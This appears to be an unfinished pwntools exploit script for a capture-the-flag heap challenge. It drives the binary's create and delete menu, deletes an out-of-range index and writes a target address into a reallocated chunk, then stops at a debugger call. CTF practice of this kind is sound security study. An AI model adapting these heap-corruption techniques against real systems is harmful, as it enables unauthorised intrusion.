#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.26.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0x4013F0,0x4013FD]
pie = 0
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat(num):
    p.recvuntil('> ')
    p.sendline(str(num))

def create(size, content):
    eat(1)
    p.sendline(str(size))
    p.send(content)

def delete(index):
    eat(2)
    p.sendline(str(index))

def puts_flag():
    eat(3)


create(0x18,'a'*0x18)
create(0x28,'a'*0x28)

delete(0x20)
create(0x18,p64(0x404080)+b'\n')
debug()

p.interactive()
